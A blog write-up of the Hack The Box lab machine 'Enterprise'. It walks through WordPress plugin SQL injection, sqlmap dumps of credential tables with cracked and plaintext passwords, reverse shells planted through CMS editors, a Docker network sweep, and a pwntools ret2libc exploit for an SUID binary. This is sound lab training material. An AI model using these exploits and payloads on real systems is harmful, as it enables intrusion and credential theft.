---
private: 'false'
layout: post
featured: false
published: true
comments: true
modified: 2018-03-18
date: 2018-03-18
title: Writeup Hackthebox - Enterprise
tags: [hackthebox]
mathjax: false
imagefeature: 
description: Writeup Hackthebox - Enterprise
category: Pentest
chart: null
---


## Machine Detail
**Name :** Enterprise<br>
**IP :** 10.10.10.61<br>
**Author :** TheHermit<br>
**Hostname :** enterprise.htb<br>
**OS :** Linux<br>

## Discovery

Port | Service | Version
--- | --- | ---
*22* | ssh | (protocol 2.0)
*80* | http | Apache httpd 2.4.10 ((Debian))
*443*  | ssl/http | Apache httpd 2.4.25 ((Ubuntu))
*8080* | http | Apache httpd 2.4.10 ((Debian))
*32812* | unknown | -

### Exploitation

In this port 80 we can see wordpress cms is installed, 
and i manage to run dirbuster on each http(s) service found, but 
the result from dirbuster not found any interesting file or directory yet

Trying to enumerate the wordpress user manually with send get request to
`http://10.10.10.61/?author=1` we can increment the id to see if there have another user
and just got 1 username `william.riker` 

next for this port SSL i try to scan using sslscan
```
•% ➜ sslscan 10.10.10.61
Version: 1.11.11-static
OpenSSL 1.0.2-chacha (1.0.2g-dev)

Connected to 10.10.10.61

Testing SSL server 10.10.10.61 on port 443 using SNI name 10.10.10.61

  TLS Fallback SCSV:
Server does not support TLS Fallback SCSV

  TLS renegotiation:
Secure session renegotiation supported

  TLS Compression:
Compression disabled

... Snip ...

  Supported Server Cipher(s):
Preferred TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
...snip... 
```

And not seeing there is vulnerability in the ssl, and start to looking with
dirbuster maybe can found interesting files/directory, And finally found `https://10.10.10.61/files/lcars.zip` this zip files
contains wordpress plugin sourcecode named `lcars`, I got 3 files inside the zip file
the file is `lcars.php, lcars_db.php, lcars_dbppost.php`

```php
// this is lcars.php
<?php
/*
*     Plugin Name: lcars
*     Plugin URI: enterprise.htb
*     Description: Library Computer Access And Retrieval System
*     Author: Geordi La Forge
*     Version: 0.2
*     Author URI: enterprise.htb
*                             */

// Need to create the user interface. 
// need to finsih the db interface
// need to make it secure

?> 
```

```php
// This is lcars_db.php
<?php
include "/var/www/html/wp-config.php";
$db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
// Test the connection:
if (mysqli_connect_errno()){
    // Connection Error
    exit("Couldn't connect to the database: ".mysqli_connect_error());
}


// test to retireve an ID
if (isset($_GET['query'])){
    $query = $_GET['query'];
    $sql = "SELECT ID FROM wp_posts WHERE post_name = $query";
    $result = $db->query($sql);
    echo $result;
} else {
    echo "Failed to read query";
}


?> 
```

in this file we could see our input is directly used to construct the SQL Query,
so this is straight forward SQL Injection, but the problem is the code is correct
because `$result` is returning an array and php can't echo-ing an array so we can't get
the output easily.

```php
// This is lcars_dbpost.php
<?php
include "/var/www/html/wp-config.php";
$db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
// Test the connection:
if (mysqli_connect_errno()){
    // Connection Error
    exit("Couldn't connect to the database: ".mysqli_connect_error());
}


// test to retireve a post name
if (isset($_GET['query'])){
    $query = (int)$_GET['query'];
    $sql = "SELECT post_title FROM wp_posts WHERE ID = $query";
    $result = $db->query($sql);
    if ($result){
        $row = $result->fetch_row();
        if (isset($row[0])){
            echo $row[0];
        }
    }
} else {
    echo "Failed to read query";
}


?> 
```

In this file we can't get SQL Injection because they cast anyting we input into integer 
with php type casting, but this can give us information about how much the records from `wp_posts` table.

after got all of this information, i just check out in the wordpress installed on port 80 
are this vulnerable plugin is installed we can validate it by opening this `http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1`
and it's seems installed, first i wanna get information from `lcars_dbpost.php` so i create little python script

```python
import requests

url = "http://10.10.10.61/wp-content/plugins/lcars/lcars_dbpost.php?query="

for x in range(150):
	tmp = url + str(x)
	print str(x),str(requests.get(tmp).text).strip()

```

and i got there was more than 40 posts, but the page just published 5 posts, i donno how the exact number becase the machine
already retired when i write this, i just think maybe the other post not published or still in draft
and we could seen the draft post using the sql injection on `lcars_db.php` I'll just use Sqlmap for this.

`sqlmap.py -u http://10.10.10.61/wp-conten/plugins/lcars_db.php?query=1 --dbs`

```
available databases [9]:
[*] blah
[*] information_schema
[*] joomla
[*] joomladb
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress
[*] wordpressdb
```
I try to extract all information from this database found
`sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 -D wordpress -T wp_users -C user_login,user_pass,user_email --dump --hex --threads 5`
```
DB:wordpress

Table:wp_users
user : william.riker
pass : $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2.
email : william.riker@enterprise.htb

Table:wp_posts
I got 1 draft post including password list

Needed somewhere to put some passwords quickly
ZxJyhGem4k338S2Y 
enterprisencc170 
ZD3YxfnSjezg67JZ 
u*Z14ru0p#ttj83zS6

DB: joomladb 
prefix : edz2g

Command : sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 -D joomladb -T edz2g_users -C username,password,email --dump --threads 10
Table : edz2g_users
+-----------------+--------------------------------------------------------------+--------------------------------+
| username | password | email |
+-----------------+--------------------------------------------------------------+--------------------------------+
| geordi.la.forge | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy | geordi.la.forge@enterprise.htb |
| Guinan | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q | guinan@enterprise.htb |
+-----------------+--------------------------------------------------------------+--------------------------------+

DB: mysql
user: joomladb  |  2eb70fd4eb74f31283541aad4e83ab6e077bc0df MySQL4.1/MySQL5 : joomlapassword!
user: root  | 95b8a7b0a041cf2011bea41db57315c603285253 MySQL4.1/MySQL5 : NCC-1701E
user:wordpressdb | 10c910bc9c2c46140dc275cb69dc6565de125630 MySQL4.1/MySQL5 : passwordwordpress
```

i just try to login to wordpress admin using username `william.riker` with every password that we found
and got `u*Z14ru0p#ttj83zS6` as the correct password and logged in to wordpress admin, and just doing common
way to get reverse shell by modified themes or plugin within wordpress panel editor i am using reverse-shell.php
from pentestmonkey.

```
Listening on [0.0.0.0] (family 0, port 9999)
Connection from [10.10.10.61] port 9999 [tcp/*] accepted (family 2, sport 59474)
Linux b8319d86d21e 4.10.0-37-generic #41-Ubuntu SMP Fri Oct 6 20:20:37 UTC 2017 x86_64 GNU/Linux
03:46:41 up 39 min, 0 users, load average: 9.35, 8.68, 8.08
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ hostname
b8319d86d21e
$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo
valid_lft forever preferred_lft forever
8: eth0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
link/ether 02:42:ac:11:00:04 brd ff:ff:ff:ff:ff:ff
inet 172.17.0.4/16 scope global eth0
valid_lft forever preferred_lft forever    
```

after got reverse shell i try to look what user is available in `/home` directory
but then i just got `user.txt` files saying we're not on the right place to get flag,
scanning with `LinEnum.sh` and got information we currently inside docker container (becase linenum.sh found file with docker stuff like .dockerenv and so on) and separate from the host.

before i move to service on port 8080, i wanna do ping sweep and port scan using the reverse shell that we got inside docker container
so maybe we'll found another docker machine ip address.

`for x in $(seq 1 255); do ping -W 1 -c 1 172.17.0.$x | grep from; done`
And got 4 Ip Address UP
```
UP: 172.17.0.1
UP: 172.17.0.2
UP: 172.17.0.3
UP :172.17.0.4
```

And i run full port scan on each ip address

```
$./nc -vz 172.17.0.1 1-65535 2>/dev/stdout | grep 'succeeded!'
Connection to 172.17.0.1 22 port [tcp/ssh] succeeded!
Connection to 172.17.0.1 80 port [tcp/http] succeeded!
Connection to 172.17.0.1 443 port [tcp/https] succeeded!
Connection to 172.17.0.1 5355 port [tcp/hostmon] succeeded!
Connection to 172.17.0.1 8080 port [tcp/http-alt] succeeded!
Connection to 172.17.0.1 32812 port [tcp/*] succeeded!

$./nc -vz 172.17.0.2 1-65535 2>/dev/stdout | grep 'succeeded!'
Connection to 172.17.0.2 3306 port [tcp/mysql] succeeded!

$./nc -vz 172.17.0.3 1-65535 2>/dev/stdout | grep 'succeeded!'
Connection to 172.17.0.3 80 port [tcp/http] succeeded!

$./nc -vz 172.17.0.4 1-65535 2>/dev/stdout | grep 'succeeded!'
Connection to 172.17.0.4 80 port [tcp/http] succeeded!
```

save this information for late and move to the next one is port 8080
in this we can see they using joomla and we already have the user and the hash password
but i can't get to crack it, so just try to use the plain text password that we have before

So i just found the correct password to login joomla
```
ZxJyhGem4k338S2Y (Guinan used to login joomla)
ZD3YxfnSjezg67JZ (geordi.la.forge used to login joomla)
```

after loggedin we just doing similiar thing for wordpress to get reverse shell

```
•% ➜ nc -lvp 1337
Listening on [0.0.0.0] (family 0, port 1337)
Connection from [10.10.10.61] port 1337 [tcp/*] accepted (family 2, sport 53630)
Linux a7018bfdc454 4.10.0-37-generic #41-Ubuntu SMP Fri Oct 6 20:20:37 UTC 2017 x86_64 GNU/Linux
 16:36:01 up 31 min,  0 users,  load average: 6.57, 9.57, 9.37
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ hostname
a7018bfdc454
$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.3/16 scope global eth0
       valid_lft forever preferred_lft forever
```

we got ip `172.17.0.3` so our information is now complete about the docker ip
```
172.17.0.1 (Host machine)
172.17.0.2 (Mysql)
172.17.0.3 (Joomla)
172.17.0.4 (Wordpress)
```

doing enumeration using linenum doesn't give interesting finding, but we could see there is 
folder name files and same content with files folder in https service, and i just check using `mount -l`

```
/dev/mapper/enterprise--vg-root on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/mapper/enterprise--vg-root on /etc/hostname type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/mapper/enterprise--vg-root on /etc/hosts type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/mapper/enterprise--vg-root on /var/www/html type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/mapper/enterprise--vg-root on /var/www/html/files type ext4 (rw,relatime,errors=remount-ro,data=ordered)
```

so the files folder is mounted same as the folder in https service, so if we add file from this joomla machine,
it will symlink to the https service, so if we wanna run reverse shell on the host machine we could try to run put the reverse shell files in folder `/files/` and
accessing the file using https service because its running on host machine.

and we got the host machine reverse shell :D

```
•% ➜ nc -lvp 1332
Listening on [0.0.0.0] (family 0, port 1332)
Connection from [10.10.10.61] port 1332 [tcp/*] accepted (family 2, sport 36426)
Linux enterprise.htb 4.10.0-37-generic #41-Ubuntu SMP Fri Oct 6 20:20:37 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 16:53:37 up 49 min,  0 users,  load average: 2.30, 2.69, 4.79
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:9d:69 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.61/24 brd 10.10.10.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:9d69/64 scope global mngtmpaddr dynamic
       valid_lft 86052sec preferred_lft 14052sec
    inet6 fe80::250:56ff:feb9:9d69/64 scope link
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:91:d8:42:b3 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:91ff:fed8:42b3/64 scope link
       valid_lft forever preferred_lft forever
5: vethd83e040@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default
    link/ether b2:e4:8e:a9:90:0e brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::b0e4:8eff:fea9:900e/64 scope link
       valid_lft forever preferred_lft forever
7: veth58ffdf7@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default
    link/ether de:07:fa:9f:e5:b9 brd ff:ff:ff:ff:ff:ff link-netnsid 2
    inet6 fe80::dc07:faff:fe9f:e5b9/64 scope link
       valid_lft forever preferred_lft forever
9: vethb9c7e9a@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default
    link/ether ca:eb:0a:77:b6:12 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::c8eb:aff:fe77:b612/64 scope link
       valid_lft forever preferred_lft forever
$ hostname
enterprise.htb
$ ls /home
jeanlucpicard
$ ls /home/jeanlucpicard/
user.txt
$ cat /home/jeanlucpicard/user.txt
08552d48aa6[REDACTED]7f1b4ba8747
$
```

after got the flag for user, i try to enumerate the host machine using `LinEnum.sh` to find a way to get root privilage
and from the LinEnum result just got binary `lcars` with suid running in port `32812` so i think
the only way to get root is from exploiting this binary, i start to doing static analysis the binary using ida.

```
•% ➜ checksec lcars
Arch: i386-32-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX disabled
PIE: PIE enabled
RWX: Has RWX segments
```

![Ida Decompile](/images/ida.png)

this binary prompt access code before we can access their menu, you can found the access code using `ltrace` because 
the binary is using `strcmp` to compare with our input

```
➜ ltrace ./lcars
__libc_start_main(0x56640c91, 1, 0xff8de674, 0x56640d30 <unfinished ...>
setresuid(0, 0, 0, 0x56640ca8)                                                                     = 0xffffffff
puts(""
)                                                                                           = 1
puts("                 _______ _______"...                 _______ _______  ______ _______
)                                                        = 49
puts("          |      |       |_____|"...          |      |       |_____| |_____/ |______
)                                                        = 49
puts("          |_____ |_____  |     |"...          |_____ |_____  |     | |    \_ ______|
)                                                        = 49
puts(""
)                                                                                           = 1
puts("Welcome to the Library Computer "...Welcome to the Library Computer Access and Retrieval System

)                                                        = 61
puts("Enter Bridge Access Code: "Enter Bridge Access Code:
)                                                                 = 27
fflush(0xf7ebdd60)                                                                                 = 0
fgets(x
"x\n", 9, 0xf7ebd5a0)                                                                        = 0xff8de5b7
strcmp("x\n", "picarda1")                                                                          = 1
puts("\nInvalid Code\nTerminating Consol"...
Invalid Code
Terminating Console

)                                                      = 35
fflush(0xf7ebdd60)                                                                                 = 0
exit(0 <no return ...>
+++ exited (status 0) +++
```

we got *picarda1* as access code, then from ida decompile we got this

```c
int main_menu()
{
  int result; // eax@2
  char v1; // [sp+Ch] [bp-19Ch]@2
  int v2; // [sp+D4h] [bp-D4h]@1
  char v3; // [sp+D8h] [bp-D0h]@5

  v2 = 0;
  startScreen();
  puts("\n");
  puts("LCARS Bridge Secondary Controls -- Main Menu: \n");
  puts("1. Navigation");
  puts("2. Ships Log");
  puts("3. Science");
  puts("4. Security");
  puts("5. StellaCartography");
  puts("6. Engineering");
  puts("7. Exit");
  puts("Waiting for input: ");
  fflush(stdout);
  __isoc99_scanf("%d", &v2);
  switch ( v2 )
  {
    case 1:
      puts("Enter System Name and Warp Speed: ");
      fflush(stdout);
      __isoc99_scanf("%s", &v1);
      puts("\nUnable to comply. Antimatter injectors are not responding\n\n");
      fflush(stdout);
      result = main_menu();
      break;
    case 2:
      puts("Enter New Bridge Log: ");
      fflush(stdout);
      __isoc99_scanf("%s", &v1);
      puts("\nUnable to comply. Tertiary data nodes are Offline\n\n");
      fflush(stdout);
      result = main_menu();
      break;
    case 3:
      puts("\nSecondary Routines not implemented\nReturning to Main Menu\n\n");
      fflush(stdout);
      result = main_menu();
      break;
    case 4:
      puts("Disable Security Force Fields");
      puts("Enter Security Override:");
      fflush(stdout);
      __isoc99_scanf("%s", &v3);
      result = printf("Rerouting Tertiary EPS Junctions: %s", &v3);
      break;
    case 5:
      puts("\nSecondary Routines not implemented\nReturning to Main Menu\n");
      fflush(stdout);
      result = main_menu();
      break;
    case 6:
      puts("\nSecondary Routines not implemented\nReturning to Main Menu\n\n");
      fflush(stdout);
      result = main_menu();
      break;
    case 7:
      exit(0);
      return result;
    default:
      result = unable();
      break;
  }
  return result;
}
```

From that 7 options just number 1,2,4 is prompt an input with scanf and we could try buffer overflow
But i can't manage to solve this because have `PIE` protection which make i can't get the exact location address for my shellcode because its randomized

After seeing ippsec video about this, actually the `ASLR` is disable in `/proc/sys/kernel/randomize_va_space`
you can verified that by running `ldd /bin/lcars | grep libc`

```python
#script by ippsec
from pwn import *

context(os="Linux", arch="i386")
HOST, PORT= "10.10.10.61", 32812

#EIP Overwrite @ 212
junk = "\x90" * 212

ret2libc = p32(0xf7e4c060) # system
ret2libc += p32(0xf7e3faf0) # exit
ret2libc += p32(0xf7f6ddd5) # sh

payload = junk + ret2libc
r=remote(HOST,PORT)
r.recvuntil("Enter Bridge Access Code:")
r.sendline("picarda1")
r.recvuntil("Waiting for input:")
r.sendline("4")
r.recvuntil("Enter Security Override:")
r.sendline(payload)
r.interactive()

```